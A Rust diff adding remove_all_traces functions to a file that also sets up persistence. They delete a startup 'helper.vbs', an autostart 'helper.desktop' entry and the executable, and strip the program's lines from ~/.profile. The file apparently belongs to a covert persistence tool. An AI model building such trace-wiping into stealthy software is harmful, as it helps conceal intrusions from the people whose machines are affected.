@@ -152,3 +152,34 @@ pub fn setup_persistence_linux() {
         }
     }
 }
+
+#[cfg(target_os = "windows")]
+pub fn remove_all_traces() {
+    use std::fs;
+    let _ = fs::remove_file(get_executable_path());
+    let _ = fs::remove_file(get_vbs_path());
+    let startup_vbs = get_startup_folder().join("helper.vbs");
+    let _ = fs::remove_file(startup_vbs);
+}
+
+#[cfg(target_os = "linux")]
+pub fn remove_all_traces() {
+    use std::fs;
+    use std::env;
+    if let Some(config_dir) = dirs::config_dir() {
+        let autostart = config_dir.join("autostart/helper.desktop");
+        let _ = fs::remove_file(autostart);
+    }
+    if let Ok(home) = env::var("HOME") {
+        let profile_path = format!("{}/.profile", home);
+        if let Ok(content) = fs::read_to_string(&profile_path) {
+            let exe_path = std::env::current_exe().unwrap().to_string_lossy().to_string();
+            let new_content: String = content
+                .lines()
+                .filter(|l| !l.contains(&exe_path))
+                .map(|l| format!("{}\n", l))
+                .collect();
+            let _ = fs::write(&profile_path, new_content);
+        }
+    }
+}
